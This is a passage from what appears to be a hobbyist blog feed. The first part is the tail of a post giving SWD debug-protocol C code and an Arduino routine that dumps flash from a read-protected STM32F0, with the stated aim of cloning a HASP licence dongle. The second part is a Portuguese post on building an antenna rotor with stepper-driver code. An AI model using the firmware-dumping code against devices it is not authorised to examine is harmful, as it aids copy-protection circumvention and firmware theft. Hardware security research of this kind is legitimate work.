        <span class="k">case</span> <span class="mh">0x01u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x08u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x02u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x10u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x03u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x18u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="nl">default:</span>
        <span class="k">case</span> <span class="mh">0x00u</span><span class="p">:</span>

            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">5u</span><span class="p">;</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x01u</span><span class="p">;</span> <span class="cm">/* startbit */</span>
    <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x80u</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">resp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionRead</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_READ_TURN</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">resp</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">resp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">header</span> <span class="o">=</span> <span class="mh">0x00u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">rp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x00u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">data1</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0u</span><span class="p">};</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirectionWrite</span><span class="p">,</span> <span class="n">portSel</span><span class="p">,</span> <span class="n">A32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>

    <span class="n">swdDataRead</span><span class="p">(</span><span class="n">rp</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>

    <span class="n">swdDataIdle</span><span class="p">();</span>

    <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="n">data1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">8u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">16u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="mi">24u</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">;</span>
    <span class="n">data1</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">swdParity</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">8u</span> <span class="o">*</span> <span class="mi">4u</span><span class="p">);</span>

    <span class="n">swdDatasend</span><span class="p">(</span><span class="n">data1</span><span class="p">,</span> <span class="mi">33u</span><span class="p">);</span>

    <span class="n">swdDataPP</span><span class="p">();</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">swdTurnaround</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">rp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadIdcode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idCode</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">ret</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">idCode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAPnBank</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">ap</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">bank</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">data</span> <span class="o">=</span> <span class="mh">0x00000000u</span><span class="p">;</span>

    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">ap</span> <span class="o">&amp;</span> <span class="mh">0xFFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">24u</span><span class="p">;</span>
    <span class="n">data</span> <span class="o">|=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">bank</span> <span class="o">&amp;</span> <span class="mh">0x0Fu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* write to select register */</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x02u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSetAP32BitMode</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="n">d</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x07u</span><span class="p">);</span>
    <span class="n">d</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadAP0</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">data</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdSelectAHBAP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdSelectAPnBank</span><span class="p">(</span><span class="mh">0x00u</span><span class="p">,</span> <span class="mh">0x00u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdReadAHBAddr</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectAP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x03u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">d</span><span class="p">);</span>

    <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdEnableDebugIF</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelectDP</span><span class="p">,</span> <span class="mh">0x01u</span><span class="p">,</span> <span class="mh">0x50000000u</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">swdStatus_t</span> <span class="nf">swdInit</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">idcode</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">swdStatusNone</span><span class="p">;</span>

    <span class="n">swdReset</span><span class="p">();</span>
    <span class="n">ret</span> <span class="o">|=</span> <span class="n">swdReadIdcode</span><span class="p">(</span><span class="n">idcode</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="maincpp">main.cpp</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">&lt;Arduino.h&gt;</span><span class="cp">
</span>
<span class="k">extern</span> <span class="s">"C"</span> <span class="p">{</span>
    <span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>    <span class="cp">#include</span> <span class="cpf">"reader.h"</span><span class="cp">
</span><span class="p">}</span>

<span class="c1">// STM32 target flash memory size in bytes</span>
<span class="kt">uint32_t</span> <span class="n">size</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>

<span class="c1">// Usually the STM32F0x starts here.</span>
<span class="c1">// If you're trying to dump another series check the datasheet.</span>
<span class="kt">uint32_t</span> <span class="n">flashAddress</span> <span class="o">=</span> <span class="mh">0x08000000</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>

    <span class="n">targetInit</span><span class="p">();</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">Serial</span><span class="p">.</span><span class="n">available</span><span class="p">())</span> <span class="p">{</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Send anything to start..."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"Starting"</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">flashData</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">status</span> <span class="o">=</span> <span class="n">extractFlashData</span><span class="p">(</span><span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flashData</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"Error reading: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">Serial</span><span class="p">.</span><span class="n">printf</span><span class="p">(</span><span class="s">"%08x: %08x</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flashAddress</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">flashData</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">Serial</span><span class="p">.</span><span class="n">println</span><span class="p">(</span><span class="s">"DONE"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">loop</span><span class="p">()</span> <span class="p">{}</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Hardware Hacking" /><category term="Protected Firmware" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="STM32" /><category term="Patreon" /><category term="MCU" /><summary type="html"><![CDATA[No processo do meu hobby de hackear hardware, encontrei um clone chin√™s de um dongle HASP HL equipado com um processador STM32F042G6U6. Minha inten√ß√£o era clon√°-lo, e durante minha explora√ß√£o, descobri quatro pinos da interface de depura√ß√£o SWD localizados na parte inferior da PCB. Soldei um conector de 4 pinos nesses pinos para facilitar o acesso.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/patreon/Pasted%20image%2020230124035811.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Rotor de Antena - Parte 2</title><link href="https://lucasteske.dev/2021/04/rotor-antenna-parte-2" rel="alternate" type="text/html" title="Rotor de Antena - Parte 2" /><published>2021-04-01T05:23:00+00:00</published><updated>2021-04-01T05:23:00+00:00</updated><id>https://lucasteske.dev/2021/04/rotor-antenna-parte-2</id><content type="html" xml:base="https://lucasteske.dev/2021/04/rotor-antenna-parte-2"><![CDATA[<p>Continuando o projeto do tracker, consegui alguns progressos significativos. Assim como o Demilson (PY2UEP) tinha cortado os motores originais, fiz o mesmo. O motor do azimute estava bem enferrujado e acabei estragando uma de suas bobinas (queria reaproveitar o fio), mas no fim o eixo saiu.</p>

<hr />

<p>Ap√≥s o eixo removido, quebrei o im√£ com um martelo at√© que n√£o sobrasse mais peda√ßos de im√£ no eixo, desta maneira restando apenas o suporte sextavado de onde era preso o im√£.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft.jpg" alt="Suporte Sextavado do Im√£ 1" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft2.jpg" alt="Suporte Sextavado do Im√£ 2" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-shaft3.jpg" alt="Suporte Sextavado do Im√£ 3" /><em>Eixo do motor do azimute mostrando o suporte sextavado do im√£</em></p>

<p>J√° para o motor da eleva√ß√£o, fiz um corte lateral no motor bem em uma marca circular que tem pr√≥ximo a sa√≠da do motor. Desse jeito poderia usar o mesmo suporte e eixos do motor original para melhor acoplamento com o redutor.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-support.jpg" alt="&quot;tampa&quot; do motor de eleva√ß√£o cortado" /><em>‚Äútampa‚Äù do motor de eleva√ß√£o cortado</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-reduction.jpg" alt="Tampa + Redutor" /><em>Tampa + Redutor</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-parts2.jpg" alt="Pe√ßas do motor" /><em>Pe√ßas do Motor</em></p>

<p>Para a eleva√ß√£o, foi nescess√°rio cortar o do motor original e fazer um ‚Äúvinco‚Äù na lateral dele para encaixar melhor na pe√ßa que seria impressa em 3D. Para fazer isso, coloquei o eixo original entre duas madeiras (por sugest√£o do meu pai) e efetuamos o corte do eixo. Para os vincos, usamos a esmerilhadeira.</p>

<p><img src="/assets/posts/tracker-mount-2/elevation-shaft-cut.jpg" alt="Eixo cortado no meio de duas madeiras" /><em>Eixo cortado no meio de duas madeiras</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-support-with-shaft.jpg" alt="Eixo cortado na tampa do motor" /><em>Eixo cortado na tampa do motor</em></p>

<p>Com isso eu poderia, ent√£o, come√ßar os desenhos em 3D para as adapta√ß√µes.</p>

<h2 id="impress√µes-3d">Impress√µes 3D</h2>

<p>Depois de muita tentativa e erro, consegui acertar os encaixes entre os eixos. Por√©m percebi um problema: O espa√ßo para o motor do azimute estava <strong>extremamente</strong> limitado, a ponto de meus motores NEMA 17 de 40mm serem grandes demais para o espa√ßo.</p>

<p><img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter.jpg" alt="Adapta√ß√£o para Azimute" />
<img src="/assets/posts/tracker-mount-2/try-azimuth-44adapter-place.jpg" alt="Adapta√ß√£o para Azimute" /><em>Adapta√ß√£o para Azimute</em></p>

<p>Para isso tive que comprar motores ‚Äúslim‚Äù para o local. Fiquei um pouco preocupado com torque, mas minhas tentativas de fazer com engrenagens e tudo mais foram por √°gua abaixo. Os motores em quest√£o foram comprados a Aliexpress (confira no fim do post pelos links)</p>

<p>Enquanto o motor n√£o chegava, fiquei otimizando os adaptadores para serem os mais curtos poss√≠veis, economizando todo espa√ßo poss√≠vel. Eu uso o <a href="https://www.freecadweb.org/">FreeCAD</a> por ser gratuito e tamb√©m onde eu sei mexer melhor. Por√©m n√£o assuma que eu realmente sou um designer 3D, pois eu n√£o sou. As pe√ßas s√£o apenas ‚Äúfuncionais‚Äù.</p>

<p><img src="/assets/posts/tracker-mount-2/azimuth-shaft-adapter.jpg" alt="Adaptador de eixo do azimute" /><em>Adaptador de eixo do azimute</em>
<img src="/assets/posts/tracker-mount-2/azimuth-support.jpg" alt="Suporte do azimute" /><em>Suporte do azimute</em>
<img src="/assets/posts/tracker-mount-2/elevation-shaft-adapter.jpg" alt="Adaptador de eixo da eleva√ß√£o" /><em>Adaptador de eixo da eleva√ß√£o</em>
<img src="/assets/posts/tracker-mount-2/elevation-motor-adapter.jpg" alt="Suporte da eleva√ß√£o" /><em>Suporte da eleva√ß√£o</em>
<img src="/assets/posts/tracker-mount-2/exploded-elevation-shaft.jpg" alt="" /></p>

<p>E o primeiro eixo a funcionar foi o da eleva√ß√£o. Para isso usei motores de 40 mm NEMA17 (link no fim do post), que de fabrica eram closed-loop (com encoder magn√©tico) por√©m acabei usando drivers TMC2209 por serem mais pr√°ticos e silenciosos.</p>

<p><img src="https://www.youtube.com/watch?v=cfUtCqb3oxA" alt="" />
<img src="https://www.youtube.com/watch?v=ENTpTZaiXl4" alt="" /></p>

<p>Ap√≥s a chegada dos novos motores para o azimute, tratei de logo montar tudo e ver se ia caber. E coube!</p>

<p><img src="/assets/posts/tracker-mount-2/assembled-azimuth-support.jpg" alt="Azimute" />
<img src="/assets/posts/tracker-mount-2/azimuth-motor-inplace.jpg" alt="Motor de Azimute no lugar" /></p>

<p>E tamb√©m funcionando!</p>

<p><img src="https://www.youtube.com/watch?v=-4U-ofHaF0E" alt="" /></p>

<p>Ap√≥s tudo funcionando, fiz os testes para saber a resolu√ß√£o final e redu√ß√£o de ambos eixos. Para isso usei este codigo para o ESP32 controlar o TMC2209 e o meu celular preso ao eixo da eleva√ß√£o para medi√ß√µes de angulo.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;TMCStepper.h&gt;</span><span class="cp">
</span>
<span class="cp">#define STEP_PIN         12 // Step
#define EN_PIN           23 // Enable
</span>
<span class="cp">#define SERIAL_PORT Serial2 // TMC2208/TMC2224 HardwareSerial port
#define DRIVER_ADDRESS 0b00 // TMC2209 Driver address according to MS1 and MS2
</span>
<span class="cp">#define R_SENSE 0.11f 
</span>
<span class="n">TMC2209Stepper</span> <span class="nf">driver</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SERIAL_PORT</span><span class="p">,</span> <span class="n">R_SENSE</span><span class="p">,</span> <span class="n">DRIVER_ADDRESS</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">STEP_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">pinMode</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
  <span class="n">digitalWrite</span><span class="p">(</span><span class="n">EN_PIN</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
  
  <span class="n">SERIAL_PORT</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>      <span class="c1">// HW UART drivers</span>
  <span class="n">Serial</span><span class="p">.</span><span class="n">begin</span><span class="p">(</span><span class="mi">115200</span><span class="p">);</span>

  <span class="n">driver</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span>                 <span class="c1">// UART: Init SW UART (if selected) with default 115200 baudrate</span>
  <span class="n">driver</span><span class="p">.</span><span class="n">toff</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>                <span class="c1">// Enables driver in software</span>
